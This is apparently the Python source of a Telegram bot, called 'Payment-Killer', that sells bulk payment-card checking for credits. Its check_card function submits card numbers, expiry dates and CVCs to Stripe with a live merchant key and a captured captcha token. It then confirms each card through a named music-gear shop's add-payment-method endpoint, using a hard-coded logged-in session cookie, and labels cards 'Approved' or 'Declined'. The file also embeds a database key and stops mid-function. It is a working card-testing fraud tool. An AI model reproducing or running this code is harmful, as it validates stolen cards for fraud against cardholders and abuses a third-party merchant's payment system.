import requests
import time
from colorama import Fore
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.constants import ChatAction
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telegram.helpers import escape_markdown
import os
import re
import random
import string
import json
from supabase import create_client, Client

# Define colors for console output
D = Fore.GREEN
E = Fore.RED
Y = Fore.YELLOW
W = Fore.WHITE
Lb = Fore.CYAN

# --- Supabase Configuration ---
SUPABASE_URL = "https://xtlvcjxrqbhrpgxdyrvi.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh0bHZjanhycWJocnBneGR5cnZpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTI1NzAxNzAsImV4cCI6MjA2ODE0NjE3MH0.Qe6aONWmlvdrYaEV09WlA_GsPMS-xxGboD_aqGrYHF0"
SUPABASE_REDEEM_TABLE = "redeem_codes"
SUPABASE_USER_CREDITS_TABLE = "user_credits"

# Initialize Supabase client
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

# --- Bot Owner IDs ---
OWNER_IDS = [7500717662, 6937568471]

# --- Conversation States for Redeem Code Generation ---
GENERATE_AMOUNT = 1
GENERATE_CREDITS = 2

# --- Supabase Functions for User Credits ---
async def get_user_credits_from_supabase(user_id: int) -> int:
    try:
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).select("credits").eq("user_id", user_id).single().execute()
        if response.data:
            return response.data['credits']
        return 0
    except Exception as e:
        # print(f"ERROR: Supabase fetch user {user_id} credits failed: {e}")
        return 0

async def update_user_credits_in_supabase(user_id: int, new_credits: int):
    try:
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).update({"credits": new_credits}).eq("user_id", user_id).execute()

        if response.data and len(response.data) > 0:
            return True
        else:
            # print(f"DEBUG: User {user_id} not found for update, attempting to create with {new_credits} credits.")
            return await create_user_credits_in_supabase(user_id, new_credits)
    except Exception as e:
        if "duplicate key value violates unique constraint" in str(e):
            # print(f"DEBUG: User {user_id} already exists during create attempt, treating as success.")
            return True
        # print(f"ERROR: Supabase create user {user_id} credits failed: {e}")
        return False

async def create_user_credits_in_supabase(user_id: int, initial_credits: int):
    try:
        data = {"user_id": user_id, "credits": initial_credits}
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).insert(data).execute()
        if response.data and len(response.data) > 0:
            return True
        return False
    except Exception as e:
        if "duplicate key value violates unique constraint" in str(e):
            # print(f"DEBUG: User {user_id} already exists during create attempt, treating as success.")
            return True
        # print(f"ERROR: Supabase create user {user_id} credits failed: {e}")
        return False

async def reset_all_user_credits_to_zero_in_supabase():
    try:
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).update({"credits": 0}).gt("credits", -1).execute() 

        if hasattr(response, 'error') and response.error:
             # print(f"ERROR: Supabase reset all user credits returned an explicit error: {response.error.message}")
             return False

        # print(f"DEBUG: All user credits reset attempt. Supabase response data: {response.data}")
        return True
    except Exception as e:
        # print(f"ERROR: Failed to reset all user credits in Supabase: {e}")
        return False

# --- Supabase Functions for Redeem Codes ---
async def load_redeem_code_from_supabase(code):
    try:
        response = supabase.from_(SUPABASE_REDEEM_TABLE).select("credits").eq("code", code).single().execute()
        if response.data:
            return response.data['credits']
        return None
    except Exception as e:
        # print(f"DEBUG: Supabase load redeem code {code} failed (expected for invalid/used codes or RLS issue): {e}")
        return None

async def add_redeem_code_to_supabase(code, credits):
    try:
        data = {"code": code, "credits": credits}
        response = supabase.from_(SUPABASE_REDEEM_TABLE).insert(data).execute()
        if response.data and len(response.data) > 0:
            return True
        # print(f"WARNING: Supabase add redeem code {code} returned no data.")
        return False
    except Exception as e:
        # print(f"ERROR: Supabase add redeem code {code} failed: {e}")
        return False

async def delete_redeem_code_from_supabase(code):
    try:
        response = supabase.from_(SUPABASE_REDEEM_TABLE).delete().eq("code", code).execute()
        if response.data and len(response.data) > 0:
            return True
        # print(f"WARNING: Supabase delete redeem code {code} returned no data (might not have existed or RLS issue).")
        return False
    except Exception as e:
        # print(f"ERROR: Supabase delete redeem code {code} failed: {e}")
        return False

def generate_unique_code(length=7):
    # Ensure redeem codes are distinct, e.g., start with "PK"
    characters = string.ascii_uppercase + string.digits
    # The length argument here is for the total length. If you want "PK" + 5, then length=7 is correct.
    return "PK" + ''.join(random.choice(characters) for i in range(length - 2)) # Adjusted for "PK" prefix

# --- Your check_card function with UPDATED headers, cookies, and data ---
def check_card(card_info):
    try:
        # Normalize separator to '|' before splitting
        normalized_card_info = card_info.replace('/', '|')
        n, mm, yy, cvc = normalized_card_info.split("|")
        # Handle 2-digit vs 4-digit year format (e.g., 25 vs 2025)
        if len(yy) == 4 and yy.startswith("20"):
            yy = yy[2:]
        elif len(yy) == 1: # Assuming single digit is also 2-digit (e.g., 5 -> 05)
            yy = f"0{yy}"

        # Check if it's a test card (common test card patterns)
        test_card_patterns = [
            "4242424242424242",  # Visa test card
            "4000000000000002",  # Visa test card (declined)
            "4000000000000069",  # Visa test card (expired)
            "4000000000000119",  # Visa test card (processing failure)
            "4000000000000127",  # Visa test card (incorrect CVC)
            "5555555555554444",  # Mastercard test card
            "5200828282828210",  # Mastercard test card (declined)
            "378282246310005",   # American Express test card
            "371449635398431",   # American Express test card
            "6011111111111117",  # Discover test card
            "30569309025904",    # Diners Club test card
            "3566002020360505",  # JCB test card
        ]
        
        if n in test_card_patterns:
            return "Error", card_info, "**It's a test card 🧪**"

        stripe_api_url = "https://api.stripe.com/v1/payment_methods"
        stripe_headers = {
            "accept": "application/json", "accept-language": "en-US,en;q=0.9", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "priority": "u=1, i", "referer": "https://js.stripe.com/", "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"', "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0",
        }

        stripe_data = (
            f"type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}"
            "&allow_redisplay=unspecified&billing_details[address][country]=BD&pasted_fields=number"
            "&payment_user_agent=stripe.js%2F2b21fdf9ae%3B+stripe-js-v3%2F2b21fdf9ae%3B+payment-element%3B+deferred-intent"
            "&referrer=https%3A%2F%2Fwww.strymon.net&time_on_page=20225"
            "&client_attribution_metadata[client_session_id]=20d125a4-e59b-4950-b884-9f012f521f55"
            "&client_attribution_metadata[merchant_integration_source]=elements"
            "&client_attribution_metadata[merchant_integration_subtype]=payment-element"
            "&client_attribution_metadata[merchant_integration_version]=2021"
            "&client_attribution_metadata[payment_intent_creation_flow]=deferred"
            "&client_attribution_metadata[payment_method_selection_flow]=merchant_specified"
            "&guid=2148cfbc-f146-4b05-92a1-b8ef6087cee5a56221"
            "&muid=be8c9cd8-17b5-48ec-861e-9815db8cfffc01c6f3"
            "&sid=f81a4406-966b-48dc-9fa8-bd1b06623f67f3f171"
            "&key=pk_live_51KgGVGAoMZ1qjkrWI1y0fQ2e4xAwNwDMuTVGeF9TA4GSTqGZCnJhZJxUeBFXW8hzUI6UiRqKKpNUZyMUMjwkYjGg00rdwxmApR"
            "&_stripe_version=2024-06-20"
            "&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzUyNTg1OTUwLCJjZGF0YSI6Ik9wZjFmOEVwak53ai84Sk9ZSlVxSlhPdlZoemhJNjhSUFpnSGJXQWxBUXg0ZFg4bFR4cEJ4L3lDQ1BpTmpGMVk1RlJzUE04NGpPNFExT0g0cGUyQ1Yva0tWam10THRDbVpKaUoyK2lSTGxjL0YzTjJZVkVxdzBXSlQ2MTVGNmZZcEExRW12Y0tmMTUwV0NEaFROa2RDSCtYbDN4Q0dXMnUzZElJRUlGWmpPZzhtdTFrWmFkd2g5YnYyQXZ6OXduU1lSVm8wSW5mdWIrRm1RaE4iLCJwYXNza2V5IjoicXZmSCsrdGVUWDZNZDFZZEF4MDAwQjJDcURITDBxZGlQYWQwL2dBYmgvcllqZllCME5mWHdscUNORGNyU2ltei9McWh0ZmpUSXkvNXppbDcxUlRZcmtwSWVKc0c0UHNZM05lb205MW9CMDlmK2QwelRaN0ZrMzhpU0tscmlFV3BGVThLZ2JBNERFcWdnQlNtVUQzV2k1TGZweGJXTElqWml6RzRVWHVEd00rYXZTVXpFMW84NEQwM244ZDVCemxXTkZKS0l2U1dWMG5aR1Urem9tMzV0ZiswNEJQcHA4U2JtRkFaSjJyMXN5dU9JRFAyQnRVcmV3M2FtZHR3MkRWdy92cENPTGNtYWgvVXBnbi8vUDkwalBwQXZwRTlCOFRCTVJIbHBNYittYmFhWlBYQVZpeXJuajVMbmtYWWdFaHFEb0dQOGxQR2dFS2ovZWRESzRVN0FuNVVuTUhkdFZSSkVCM2c1djBDYkJIZFBibGR5cWpuVXlUQkkzNDFPUEVCNmUwcG1sTWNGVEZ2czZoeDNCME4yNS9SdU05WUlFcjlGV2dCaGxpdHFRQjVUZVBEQi9WTFcwZXM5QTkzVllybDVLVWdpT0FYYU9yVTdBckltNGdVSU9oWGZoYnJJamhMRnMxai9reUxvOGViaC92Y3dMSHY4d2MvRmF5RGRkWloyRVZIbkc3c1JoNzdKb2ZTa0pCdi80WTlXbFNLYWFqNzlUWDU2TWlUMnlWRGRjT091K3VLQW8zUC9mYkErem4vTWdnSU5GajEra1k3RFl0bXZGc2JpOHZHTGNvZ0VTWjNLSnVWMytFMUdLbW9wVWJHK2xqWEpZNjd5TGd5V1VrR2FPTmZScWd2ZmxKY2c3QlBCcnJrMGhkVmU0M0VaMUZoSUtHVFhZbW80bzhBKzQ4UnI3MUltQVRiZ3p4ZmdIMGRHNzRZd0JLM1JwVXlUT1FsZVE5cGw0U3JYUVE2Rk5lQzlYVjRBajNzdHZoaHlxelhxWUhpc3Mra01DQ3lCdHg4RnE1dmN5VzhOMkIwNW5CWFZPOTFEWThYZmxXdjBwdmgxcDdiT21laUtvYjJoWHNtUXlpUENwbGt2T2s2Z1FLV0EySjRUemZTd0xoWS9VMW8ySU9aYXF0RC81Y1pDQm9lbTB1SlRqci9jbWlzcER2TkMrcjdGS0ZQSHJNUVFZcVUvUTJVTjNSeDRmVExVM2lWYnRub3BWdmFpYjZIb2RTajU5RWlhREp3QXplWVNVWEM1T2pUWFFWcGswNlNjaDJHd3EyKzFXTlhPdC8vdDcxV1I2dE94M1ZGaldwYU9KZGx5Uy9KUFlHQ2ZrdUlqeFVkUzNieWlXak5YODQ1VVZScHpjSVdoczY0UWNhKzNxTUQ0bDNKdnNGWVpBUlViNTJrQk51TFVCM1RJTkUydm5kQUhmeldNU3MvS09ES1QwQzFoZ3lISmVmeDJqYi9HQ3diK2lNelhjS3Zxc0U2MGl2ZTdDcVlnRGlIMjQ4QjAyWmlCd2RTcXFyUmoxK3NpY29iQUhraUdqK3ZPbFNRVkZ5ZEpBa3l1YkdNb1FlZmdxK2RTNGpOQU94bElZVkFDRjRNM29vVDZjRG0vbjdkcHNWNVRqL1VvQ0YveDBPT3k4UnROYzNRazRIMGRrUzBNTi9rcll6UjhVNmFuMlFvZSs2MDZ3ckNsTW5oeUJCQ3dQOW5mMjJNeENYeXZqamEvcXdqbERHbjVJQkY5U1UrUUc2bkZtMXZuYTRSa2NMKzA1eHZNbEtMc2hoV2EzdFpUZHJaaUNjaVBNK3UzdmZYUUk5S1pvejczcitxcnRLR0plcmhkaDlPV0FEV0RjRlI2RWtLcGptV1dyNjJnSWkwbUxDZDdkak5MNlRDcThqSjRhejlabXlsNExLbUdPSGlJK3A5L0l0ODdKWGpUbGtMc09sRDBHRXA0ZlRYMnh1N1ZWUkNVV0xjUnBwbklCNnVWYlhiY3FSK25Cdkl3ZGs1RmhnZk1ianRwUG1YU0V2aGtSbitUbVNBZTFrMnBuOGpaZGpKVTNPUzRjb2pERnYzcndFOTk4cGlORkoza1NhMlIyTkFLU3F3bFVlZ3JVV1kvdUp2TDdjOVZRYVBYZDZqTnc1ZHZLL3h5dlZhcTN0QXJQM29DelB3S015TmNFbVFQZWNlNENpc1FLT05kRk1id3U5UCtFWStqNFM4RFNiTnhzdFFwdm1NOTRjeHhwa1RaYi9BUUs5TDVqRkhaWDVjZDRnb3R1YlFCOFEwUEpIMXkwU2FaUjdnSDQwMktJbmtBUmNXS3oxMU9VSCtlazEyV0ppK1RvcVM2ZlRNWUI2U1Ava0EzOWx1K0JQWjI0SlM1UT09Iiwia3IiOiI0MDBlYjVmIiwic2hhcmRfaWQiOjI1OTE4OTM1OX0.Q2Dj9h_3ROu_cOwRT53SuRj2eJLOW8zAOx6YCFaxYH0"
        )

        strymon_url = "https://www.strymon.net/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
        strymon_headers = {
            "accept": "*/*", "accept-language": "en-US,en;q=0.9", "content-type": "application/x-www-form-urlencoded; charset=UTF-8", "origin": "https://www.strymon.net", "priority": "u=1, i", "referer": "https://www.strymon.net/my-account/add-payment-method/", "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"', "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"', "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0", "x-requested-with": "XMLHttpRequest",
        }

        strymon_cookies = {
            "__stripe_mid": "be8c9cd8-17b5-48ec-861e-9815db8cfffc01c6f3", "wordpress_logged_in_6a3ae81458afebc3533a2a615b353027": "railway%7C1753723994%7Cj6yg35uJ3pt5Pxsc5bd6DSn5WwNPBPQ9qfvHyNLWVOi%7Cbc107cffdaa2e2b5e2817d5666938e718f56a6d24b226f619900dd71229c5fd4", "sbjs_migrations": "1418474375998%3D1", "sbjs_current_add": "fd%3D2025-07-15%2013%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.strymon.net%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29", "sbjs_first_add": "fd%3D2025-07-15%2013%3A23%3A40%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.strymon.net%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29", "sbjs_current": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29", "sbjs_first": "typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29", "sbjs_udata": "vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36%20Edg%2F138.0.0.0", "sbjs_session": "pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.strymon.net%2Fmy-account%2Fadd-payment-method%2F", "__stripe_sid": "f81a4406-966b-48dc-9fa8-bd1b06623f67f3f171",
        }
        strymon_data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": "tome",
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": "273337491f",
        }

        # Step 1: Create Payment Method with Stripe
        stripe_pm_response = requests.post(stripe_api_url, headers=stripe_headers, data=stripe_data)
        stripe_pm_response.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)

        try:
            pm_json = stripe_pm_response.json()
            if pm_json.get('id') and pm_json.get('type') == 'card' and pm_json.get('card', {}).get('last4'):
                payment_method_id = pm_json['id']
                strymon_data_updated = strymon_data.copy()
                strymon_data_updated["wc-stripe-payment-method"] = payment_method_id

                response_strymon = requests.post(strymon_url, headers=strymon_headers, cookies=strymon_cookies, data=strymon_data_updated)
                response_strymon.raise_for_status() # This will raise an exception for 4xx/5xx responses

                msg_json = response_strymon.json()
                msg_text = response_strymon.text # Get raw text for 'purchase'/'error' checks

                # APPROVED condition
                if msg_json.get('success') is True and msg_json.get('data', {}).get('status') == 'succeeded':
                    return "Approved", card_info, None
                # DECLINED condition
                elif msg_json.get('success') is False and msg_json.get('data', {}).get('error', {}).get('message') == 'Your card was declined.':
                    return "Declined", card_info, "Your card was declined."
                # SERVER ERROR with specific messages
                else:
                    if "purchase" in msg_text.lower():
                        return "Error", card_info, "**Unsupported Card 😂**"
                    elif "error" in msg_text.lower():
                        return "Error", card_info, "**Error while checking this card 😂**"
                    else:
                        return "Error", card_info, "**Gateway died successfully 😂**"

            else:
                return "Error", card_info, "**Gateway died successfully 😂**" # Default to gateway died if Stripe PM creation fails or is invalid

        except ValueError:
            return "Error", card_info, "**Failed to parse JSON response from Stripe or Strymon 😂**"
        except requests.exceptions.RequestException as e:
            # This block catches HTTP errors (e.g., 404, 500) from requests.post
            if isinstance(e, requests.exceptions.HTTPError) and e.response is not None and e.response.status_code == 404:
                return "Error", card_info, "**Gateway 404 Error 😂**"
            else:
                return "Error", card_info, f"**Gateway died successfully 😂**" # Generic gateway error

    except requests.exceptions.RequestException as e:
        # This block catches HTTP errors (e.g., 404, 500) from the initial Stripe call
        if isinstance(e, requests.exceptions.HTTPError) and e.response is not None and e.response.status_code == 404:
            return "Error", card_info, "**Gateway 404 Error 😂**"
        else:
            return "Error", card_info, f"**Gateway died successfully 😂**" # Generic gateway error
    except Exception as e:
        return "Error", card_info, f"**Gateway died successfully 😂**" # Catch-all for unexpected errors

# --- Define the custom keyboard ---
main_keyboard = [
    [KeyboardButton("Profile"), KeyboardButton("Help")]
]
reply_markup = ReplyKeyboardMarkup(main_keyboard, resize_keyboard=True, one_time_keyboard=False)


# --- Telegram bot command handlers ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name if update.effective_user.first_name else "there"

    escaped_user_name = escape_markdown(user_name, version=2)

    try:
        response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).select("user_id").eq("user_id", user_id).single().execute()
        user_exists_in_db = bool(response.data)
    except Exception as e:
        print(f"DEBUG: Error checking user existence for {user_id}: {e}. Assuming user does not exist.")
        user_exists_in_db = False

    if not user_exists_in_db:
        success_create = await create_user_credits_in_supabase(user_id, 0)
        if not success_create:
            print(f"ERROR: Failed to CREATE user {user_id} during start_command.")
            pass

    await update.message.reply_text(
        f"Hello *{escaped_user_name}*\\! Welcome to the *Payment\\-Killer* Bot\\. Let's check a card\\.",
        reply_markup=reply_markup,
        parse_mode='MarkdownV2'
    )

async def help_command(update: Update, Context: ContextTypes.DEFAULT_TYPE):
    await Context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    # Updated Help message for clarity and better formatting
    await update.message.reply_text(
        "*How to use PaymentKillerBot:*\n\n"
        "💳 *1\\. Checking Cards:*\n"
        "Send card details in the format: `CARD_NUMBER|MM|YY|CVC` or `CARD_NUMBER/MM/YYYY/CVC`\\.\n"
        "   *Example:*\n"
        "   `44242424242424242|03|33|333`\n"
        "You can send *multiple cards* by placing each on a new line for batch processing\\.\n\n"
        "💰 *2\\. Redeeming Credits:*\n"
        "To redeem a credit code, simply send the code directly in the chat\\. All valid redeem codes start with `PK`\\.\n\n"
        "👤 *3\\. Your Profile:*\n"
        "Tap the *'Profile'* button to view your current credit balance and Telegram account information\\.\n\n"
        "⚙️ *Important Notes:*\n"
        "\\Ensure your card details are *always* in the correct format for accurate checks\\.\n"
        "\\For any issues or support, contact the developer: *@notnafiz*", # Directly using @username, which Telegram makes clickable
        parse_mode='MarkdownV2'
    )

async def multiple_check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    await update.message.reply_text(
        "Please send multiple card details, each on a new line (N|MM|YY|CVC):\n"
        "Example:\n"
        "*44242424242424242|03|33|333*\n",
        parse_mode='MarkdownV2'
    )

async def credits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    user_id = update.effective_user.id
    credits = await get_user_credits_from_supabase(user_id)
    await update.message.reply_text(f"You currently have *{escape_markdown(str(credits), version=2)}* credit\\(s\\)\\.", parse_mode='MarkdownV2')

async def profile_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    user = update.effective_user
    user_id = user.id
    credits = await get_user_credits_from_supabase(user_id)

    full_name = f"{user.first_name}"
    if user.last_name:
        full_name += f" {user.last_name}"

    escaped_full_name = escape_markdown(full_name, version=2)
    escaped_username_display = escape_markdown(f"@{user.username}" if user.username else "N/A", version=2) # Changed "Not set" to "N/A"
    escaped_credits = escape_markdown(str(credits), version=2)

    # Updated Profile message for better formatting
    if user:
        await update.message.reply_text(
            f"👤 *Your Profile Details:*\n"
            f"   \\ *Name:* {escaped_full_name}\n"
            f"   \\ *Telegram ID:* `{user.id}`\n"
            f"   \\ *Username:* {escaped_username_display}\n"
            f"   \\ *Current Credits:* *{escaped_credits}*",
            parse_mode='MarkdownV2'
        )
    else:
        await update.message.reply_text(escape_markdown("Could not retrieve your profile information\\. Please try again\\.", version=2), parse_mode='MarkdownV2')


# --- Admin commands for generating redeem codes ---
async def generate_redeem_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_IDS:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        await update.message.reply_text(escape_markdown("You are not authorized to use this command\\.", version=2), parse_mode='MarkdownV2')
        return ConversationHandler.END

    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    await update.message.reply_text(escape_markdown("How many codes to generate?", version=2), parse_mode='MarkdownV2')
    return GENERATE_AMOUNT

async def get_redeem_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    try:
        num_codes = int(update.message.text.strip())
        if num_codes <= 0:
            await update.message.reply_text(escape_markdown("Please enter a positive number\\. How many codes to generate?", version=2), parse_mode='MarkdownV2')
            return GENERATE_AMOUNT
        context.user_data['num_codes_to_generate'] = num_codes
        await update.message.reply_text(escape_markdown("Credits per code?", version=2), parse_mode='MarkdownV2')
        return GENERATE_CREDITS
    except ValueError:
        await update.message.reply_text(escape_markdown("Invalid input\\. Please enter a number for the amount of codes\\.", version=2), parse_mode='MarkdownV2')
        return ConversationHandler.END

async def get_redeem_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    try:
        credits_per_code = int(update.message.text.strip())
        if credits_per_code <= 0:
            await update.message.reply_text(escape_markdown("Please enter a positive number\\. How many credits will each code contain?", version=2), parse_mode='MarkdownV2')
            return GENERATE_CREDITS

        num_codes = context.user_data['num_codes_to_generate']

        header_message_part = escape_markdown("Here are your generated redeem codes:", version=2)
        generated_codes_list = []

        for _ in range(num_codes):
            unique_code = generate_unique_code(length=7) # Now generates with "PK" prefix
            success = await add_redeem_code_to_supabase(unique_code, credits_per_code)
            if success:
                generated_codes_list.append(f"`{unique_code}`")
            else:
                generated_codes_list.append(escape_markdown(f"Failed to generate and save code for {unique_code}", version=2))

        final_message = f"{header_message_part}\n" + "\n".join(generated_codes_list)

        try:
            await update.message.reply_text(final_message, parse_mode='MarkdownV2')
        except Exception as e:
            print(f"ERROR: Failed to send generated redeem codes message. Raw message: {final_message}. Error: {e}")
            await update.message.reply_text(escape_markdown("An error occurred while sending the codes\\. Please check console for details\\.", version=2), parse_mode='MarkdownV2')

        context.user_data.clear()
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text(escape_markdown("Invalid input\\. Please enter a number for the credits per code\\.", version=2), parse_mode='MarkdownV2')
        return ConversationHandler.END

async def cancel_generation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    await update.message.reply_text(escape_markdown("Redeem code generation cancelled\\.", version=2), reply_markup=reply_markup, parse_mode='MarkdownV2')
    context.user_data.clear()
    return ConversationHandler.END

# --- Admin command to reset all user credits ---
async def nocredit_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in OWNER_IDS:
        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        await update.message.reply_text(escape_markdown("You are not authorized to use this command\\.", version=2), parse_mode='MarkdownV2')
        return

    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    success = await reset_all_user_credits_to_zero_in_supabase()
    if success:
        message_text = escape_markdown("✅ All user credits have been reset to zero!", version=2)
        await update.message.reply_text(f"*{message_text}*", parse_mode='MarkdownV2')
    else:
        await update.message.reply_text(escape_markdown("Failed to reset all user credits\\. Check console for errors or verify Supabase RLS policy\\.", version=2), parse_mode='MarkdownV2')


# --- Main message handler ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    # Handle button presses
    if user_input == "Profile":
        await profile_command(update, context)
        return
    elif user_input == "Help":
        await help_command(update, context)
        return

    # Prevent concurrent card checks
    if context.chat_data.get('is_checking_cards', False):
        await context.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)
        await update.message.reply_text(f"*{escape_markdown('I am currently checking other cards. Please wait until the current process is finished. Try again later.', version=2)}*", parse_mode='MarkdownV2')
        return

    # Split input by lines and filter out empty ones
    input_lines = [line.strip() for line in user_input.split('\n') if line.strip()]

    # FIRST: Attempt to process as card details
    potential_card_inputs = []
    # Regular expression updated to accept either '|' or '/' as separator
    card_regex = r'\d{13,19}[|/]\d{1,2}[|/]\d{2,4}[|/]\d{3,4}' 

    if input_lines: 
        all_lines_are_cards = True
        for line in input_lines:
            if not re.fullmatch(card_regex, line):
                all_lines_are_cards = False
                break
            potential_card_inputs.append(line)

        if all_lines_are_cards:
            if len(potential_card_inputs) > 100:
                await context.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)
                await update.message.reply_text(
                    f"You can only check a *{escape_markdown('maximum of 100 cards', version=2)}* at once\\. Please send fewer cards\\.",
                    parse_mode='MarkdownV2'
                )
                return

            context.chat_data['is_checking_cards'] = True
            try:
                current_credits = await get_user_credits_from_supabase(user_id)

                user_exists_check_response = supabase.from_(SUPABASE_USER_CREDITS_TABLE).select("user_id").eq("user_id", user_id).single().execute()
                if not user_exists_check_response.data:
                    await create_user_credits_in_supabase(user_id, 0)
                    current_credits = 0

                is_owner = user_id in OWNER_IDS

                # Check if non-owner has enough credits BEFORE processing any cards
                if not is_owner and current_credits < len(potential_card_inputs):
                    await context.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)
                    await update.message.reply_text(
                        f"❌ *{escape_markdown('You do not have enough credits', version=2)}* to check these cards\\. You have *{escape_markdown(str(current_credits), version=2)}* credit\\(s\\) but need *{escape_markdown(str(len(potential_card_inputs)), version=2)}*\\." +
                        f"\n\n⚠️ *{escape_markdown('Please add more credits to continue', version=2)}*", # New message for insufficient credits
                        reply_markup=reply_markup,
                        parse_mode='MarkdownV2'
                    )
                    return

                for card_info in potential_card_inputs:
                    await context.bot.send_chat_action(chat_id=chat_id, action=ChatAction.TYPING)

                    # Logic for allowing owners to check even with 0 credits, and deducting for all if available
                    if is_owner or (current_credits >= 1): # Owners are allowed regardless of credits, non-owners need >=1
                        checking_message_text = f"Checking card: `{escape_markdown(card_info, version=2)}`"
                        checking_message = None
                        try:
                            checking_message = await update.message.reply_text(checking_message_text, parse_mode='MarkdownV2')
                        except Exception as e:
                            print(f"ERROR: Failed to send 'Checking card' message for {card_info[:4]}.... Error: {e}")
                            await update.message.reply_text(escape_markdown(f"An error occurred while preparing to check card {card_info[:4]}.... Please try again\\.", version=2), parse_mode='MarkdownV2')
                            continue

                        start_time = time.time()
                        status_type, original_card_info, reason = check_card(card_info)
                        end_time = time.time()
                        delay = round(end_time - start_time, 2)

                        if status_type == "Approved":
                            escaped_card_info = escape_markdown(original_card_info, version=2)
                            escaped_delay = escape_markdown(str(delay), version=2)
                            escaped_bot_name = escape_markdown('PaymentKillerBot', version=2)

                            result_message = (
                                f"Card: `{escaped_card_info}`\n"
                                f"Status: *{escape_markdown('Approved ✅', version=2)}*\n"
                                f"Gateway: *{escape_markdown('Stripe Auth', version=2)}*\n"
